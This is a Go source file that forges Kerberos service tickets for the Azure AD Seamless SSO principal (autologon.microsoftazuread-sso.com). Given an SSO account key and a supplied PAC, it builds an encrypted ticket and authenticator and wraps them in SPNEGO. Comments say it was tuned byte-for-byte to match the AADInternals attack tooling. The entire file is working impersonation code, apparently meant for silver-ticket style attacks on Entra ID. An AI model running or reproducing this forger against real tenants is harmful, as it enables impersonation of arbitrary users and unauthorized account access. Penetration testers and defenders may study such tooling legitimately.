package ticket

import (
	cryptorand "crypto/rand"
	"fmt"
	"time"

	"github.com/jcmturner/gofork/encoding/asn1"
	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana/chksumtype"
	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

type ForgeParams struct {
	Key           []byte
	EType         int32
	UserPrincipal string
	Realm         string
	PAC           []byte
	UserName      string
}

type ForgedTicket struct {
	SPNEGOBytes []byte
}

func Forge(params *ForgeParams) (*ForgedTicket, error) {
	now := time.Now().UTC()
	renewTill := now.Add(24 * time.Hour * 7)

	// Session key
	sessionKey := types.EncryptionKey{
		KeyType:  etypeID.AES256_CTS_HMAC_SHA1_96,
		KeyValue: randomBytes(32),
	}

	// Service principal: HTTP/autologon.microsoftazuread-sso.com
	sname := types.PrincipalName{
		NameType:   nametype.KRB_NT_SRV_INST,
		NameString: []string{"HTTP", "autologon.microsoftazuread-sso.com"},
	}

	cname := types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{params.UserName},
	}

	// Build authorization data: PAC + MS-KILE auth data
	authData := buildAuthorizationData(params)

	// Build EncTicketPart
	// Use exact flag bytes matching AADInternals (0x40, 0xA1, 0x00, 0x00)
	// These correspond to: forwardable + renewable + initial + pre_authent + name_canonicalize
	// in the RFC 4120 bit ordering expected by the Windows Kerberos stack on the WS-Trust endpoint.
	ticketFlags := types.NewKrbFlags()
	ticketFlags.Bytes = []byte{0x40, 0xA1, 0x00, 0x00}
	ticketFlags.BitLength = 32

	encPart := messages.EncTicketPart{
		Flags:             ticketFlags,
		Key:               sessionKey,
		CName:             cname,
		CRealm:            params.Realm,
		Transited:         messages.TransitedEncoding{TRType: 1, Contents: []byte{}},
		AuthTime:          now,
		StartTime:         now,
		EndTime:           now.Add(10 * time.Hour),
		RenewTill:         renewTill,
		// CAddr intentionally omitted (optional, not present in AADInternals)
		AuthorizationData: authData,
	}

	// Encrypt EncTicketPart
	ssoKey := types.EncryptionKey{
		KeyType:  params.EType,
		KeyValue: params.Key,
	}

	et, err := crypto.GetEtype(params.EType)
	if err != nil {
		return nil, fmt.Errorf("get etype %d: %w", params.EType, err)
	}

	// Marshal EncTicketPart as plain SEQUENCE (gokrb5 doesn't add APPLICATION 3 wrapper)
	encPartBody, err := asn1.Marshal(encPart)
	if err != nil {
		return nil, fmt.Errorf("marshal encpart: %w", err)
	}
	// Wrap in APPLICATION 3 (0x63) tag per RFC 4120 — Entra ID requires this
	encPartBytes := make([]byte, 0, 4+len(encPartBody))
	encPartBytes = append(encPartBytes, 0x63)
	encPartBytes = append(encPartBytes, derLenBytes(len(encPartBody))...)
	encPartBytes = append(encPartBytes, encPartBody...)

	_, cipher, err := et.EncryptMessage(ssoKey.KeyValue, encPartBytes, keyusage.KDC_REP_TICKET)
	if err != nil {
		return nil, fmt.Errorf("encrypt ticket: %w", err)
	}

	ticket := messages.Ticket{
		TktVNO: 5,
		Realm:  params.Realm,
		SName:  sname,
		EncPart: types.EncryptedData{EType: params.EType, KVNO: 5, Cipher: cipher},
		// Do NOT set DecryptedEncPart — it leaks into ASN.1 output!
		// NewAPReq handles session key separately.
	}

	// Build authenticator
	subKey := types.EncryptionKey{
		KeyType:  etypeID.AES256_CTS_HMAC_SHA1_96,
		KeyValue: randomBytes(32),
	}

	// GSS-API checksum over ticket bytes
	ticketBytes, err := ticket.Marshal()
	if err != nil {
		return nil, fmt.Errorf("marshal ticket for checksum: %w", err)
	}

	gssChecksum, err := et.GetChecksumHash(sessionKey.KeyValue, ticketBytes, keyusage.AP_REQ_AUTHENTICATOR_CHKSUM)
	if err != nil {
		return nil, fmt.Errorf("gssapi checksum: %w", err)
	}

	auth := types.Authenticator{
		AVNO:              5,
		CName:             cname,
		CRealm:            params.Realm,
		CTime:             now,
		Cusec:             now.Nanosecond() / 1000,
		SubKey:            subKey,
		SeqNumber:         0,
		Cksum:             types.Checksum{CksumType: chksumtype.GSSAPI, Checksum: gssChecksum},
		AuthorizationData: buildAuthAuthData(params),
	}

	// Build APReq using NewAPReq — this encrypts the authenticator with the session key
	apReq, err := messages.NewAPReq(ticket, sessionKey, auth)
	if err != nil {
		return nil, fmt.Errorf("new apreq: %w", err)
	}
	// Match AADInternals APOptions
	apReq.APOptions = types.NewKrbFlags()
	apReq.APOptions.Bytes = []byte{0x20, 0x00, 0x00, 0x00}
	apReq.APOptions.BitLength = 32

	// Marshal APReq
	apReqBytes, err := apReq.Marshal()
	if err != nil {
		return nil, fmt.Errorf("marshal apreq: %w", err)
	}

	// SPNEGO wrap
	spnegoBytes, err := BuildSPNEGO(apReqBytes)
	if err != nil {
		return nil, fmt.Errorf("spnego: %w", err)
	}

	return &ForgedTicket{SPNEGOBytes: spnegoBytes}, nil
}

// ---------- MS-KILE Authorization Data ----------

const (
	KERB_AUTH_DATA_TOKEN_RESTRICTIONS = 141
	KERB_LOCAL                        = 142
	KERB_AP_OPTIONS                   = 143
	KERB_SERVICE_TARGET               = 144
	AD_ETYPE_NEGOTIATION              = 129
	AD_WIN2K_PAC                      = 128
	AD_IF_RELEVANT                    = 1
)

func buildAuthorizationData(params *ForgeParams) []types.AuthorizationDataEntry {
	tokenRest := types.AuthorizationDataEntry{
		ADType: KERB_AUTH_DATA_TOKEN_RESTRICTIONS,
		ADData: []byte{1, 0, 0, 0, 0, 0, 0, 0, 0, 0x10, 0, 0, 0, 0, 0, 0, 0}, // Flags=1, IL=0x1000, MachineID=0
	}

	svcTarget := buildServiceTarget(params.Realm)

	// Wrap PAC in AD-IF-RELEVANT (matching AADInternals)
	pacEntry := types.AuthorizationDataEntry{ADType: AD_WIN2K_PAC, ADData: params.PAC}
	pacDER, _ := asn1.Marshal(pacEntry)
	pacWrapped := types.AuthorizationDataEntry{ADType: AD_IF_RELEVANT, ADData: pacDER}

	return []types.AuthorizationDataEntry{
		pacWrapped,
		tokenRest,
		{ADType: KERB_LOCAL, ADData: []byte{}},
		{ADType: KERB_AP_OPTIONS, ADData: []byte{0, 0, 0, 0}},
		svcTarget,
		{ADType: AD_ETYPE_NEGOTIATION, ADData: []byte{
			23, 0, 0, 0, // RC4-HMAC
			17, 0, 0, 0, // AES128-CTS-HMAC-SHA1-96
			18, 0, 0, 0, // AES256-CTS-HMAC-SHA1-96
		}},
	}
}

// buildAuthAuthData creates the authorization-data sequence for the Authenticator.
// Matches AADInternals authenticator auth-data entries at the DER byte level.
func buildAuthAuthData(params *ForgeParams) []types.AuthorizationDataEntry {
	// AD-IF-RELEVANT wrapping AdETypeNegotiation
	// Manual DER to match AADInternals exact encoding:
	// SEQUENCE {
	//   [0] INTEGER 1
	//   [1] OCTET STRING {
	//     SEQUENCE { [0] INTEGER 129, [1] OCTET STRING { SEQUENCE { INTEGER 23 } } }
	//   }
	// }
	etypeInner := derSequence(derInteger(23)) // SEQUENCE { INTEGER 23 }
	etypeAD := derSequence(
		derTag(0xA0, derInteger(129)),
		derTag(0xA1, derOCTET(etypeInner)),
	)
	adIR := derSequence(
		derTag(0xA0, derInteger(1)),
		derTag(0xA1, derOCTET(etypeAD)),
	)
	adIfRelevant := types.AuthorizationDataEntry{ADType: 1, ADData: adIR}

	// Token Restriction
	tokenRestData := derSequence(
		derTag(0xA0, derInteger(0)),
		derTag(0xA1, derOCTET([]byte{
			0, 0, 0, 0, // Flags
			0, 0x10, 0, 0, // IntegrityLevel = 0x1000
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, // MachineID
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
		})),
	)
	tokenRest := types.AuthorizationDataEntry{
		ADType: KERB_AUTH_DATA_TOKEN_RESTRICTIONS,
		ADData: tokenRestData,
	}

	// KerbLocal
	kerbLocal := types.AuthorizationDataEntry{
		ADType: KERB_LOCAL,
		ADData: make([]byte, 16),
	}

	// KerbApOptions = ChannelBindingSupported (0x40000000)
	kerbApOpts := types.AuthorizationDataEntry{
		ADType: KERB_AP_OPTIONS,
		ADData: []byte{0, 0x40, 0, 0},
	}

	// KerbServiceTarget: HTTP/autologon...@REALM
	svc := utf16LEBytes("HTTP/autologon.microsoftazuread-sso.com@" + params.Realm)
	stData := make([]byte, 4+len(svc))
	stData[0] = byte(len(svc)); stData[1] = byte(len(svc) >> 8)
	copy(stData[4:], svc)
	svcTarget := types.AuthorizationDataEntry{
		ADType: KERB_SERVICE_TARGET,
		ADData: stData,
	}

	return []types.AuthorizationDataEntry{
		adIfRelevant,
		tokenRest,
		kerbLocal,
		kerbApOpts,
		svcTarget,
	}
}

// DER helper functions
func derInteger(v int32) []byte {
	b := make([]byte, 4)
	b[0] = byte(v >> 24); b[1] = byte(v >> 16); b[2] = byte(v >> 8); b[3] = byte(v)
	i := 0
	for i < 3 && b[i] == 0 && (b[i+1]&0x80) == 0 {
		i++
	}
	out := []byte{0x02, byte(4 - i)}
	out = append(out, b[i:]...)
	return out
}

func derOCTET(data []byte) []byte {
	return derTag(0x04, data)
}

func derTag(tag byte, data []byte) []byte {
	out := []byte{tag}
	out = append(out, derLenBytes(len(data))...)
	out = append(out, data...)
	return out
}

func derSequence(parts ...[]byte) []byte {
	var data []byte
	for _, p := range parts {
		data = append(data, p...)
	}
	out := []byte{0x30}
	out = append(out, derLenBytes(len(data))...)
	out = append(out, data...)
	return out
}

func derLenBytes(n int) []byte {
	switch {
	case n < 128:
		return []byte{byte(n)}
	case n < 256:
		return []byte{0x81, byte(n)}
	default:
		return []byte{0x82, byte(n >> 8), byte(n)}
	}
}

func buildServiceTarget(realm string) types.AuthorizationDataEntry {
	svc := utf16LEBytes("HTTP/autologon.microsoftazuread-sso.com")
	realmBytes := utf16LEBytes(realm)
	data := make([]byte, 4+len(svc)+len(realmBytes))
	data[0] = byte(len(svc))
	data[1] = byte(len(svc) >> 8)
	data[2] = byte(len(realmBytes))
	data[3] = byte(len(realmBytes) >> 8)
	copy(data[4:], svc)
	copy(data[4+len(svc):], realmBytes)
	return types.AuthorizationDataEntry{ADType: KERB_SERVICE_TARGET, ADData: data}
}

// ---------- Helpers ----------

func randomBytes(n int) []byte {
	b := make([]byte, n)
	cryptorand.Read(b)
	return b
}

func utf16LEBytes(s string) []byte {
	var out []byte
	for _, r := range s {
		out = append(out, byte(r), byte(r>>8))
	}
	return out
}
